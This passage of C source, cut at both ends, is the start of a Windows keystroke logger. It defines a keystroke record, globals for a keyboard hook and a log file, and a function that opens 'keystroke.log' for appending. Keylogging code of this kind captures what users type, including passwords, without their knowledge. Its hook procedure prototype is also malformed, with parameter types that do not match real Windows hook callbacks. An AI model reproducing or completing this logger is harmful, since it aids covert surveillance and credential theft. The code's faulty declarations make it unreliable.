    long int timestamp;
    char key;
    char modifiers;
} KEYSTROKE;

// Initialize global variables
FILE *file;
HHOOK hook;
KEYSTROKE keystroke;

// Function prototypes
void KeyboardHookProc(int nCode, int wParam, struct HWND__*hwnd, struct keyboardInputUnion *inputUnion);
void Cleanup(HWND hwnd, HHOOK hook);

// Initialize the keystroke logger
void InitializeLogger() {
    file = fopen("keystroke.log", "a");
    if (file == NULL) {
